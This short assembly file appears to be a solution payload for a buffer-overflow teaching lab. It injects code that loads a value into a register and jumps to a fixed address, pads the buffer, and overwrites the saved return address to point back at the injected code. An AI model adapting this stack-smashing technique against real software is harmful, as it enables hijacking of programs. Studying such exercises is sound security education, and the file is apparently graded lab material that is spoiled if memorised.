rsp:
    movl 0x605524, %edi
    pushq $0x40188f
    retq

pad:
    .org rsp + 0x18, 0x23

rbp:
    .quad rsp

tail:
    .byte 0xa
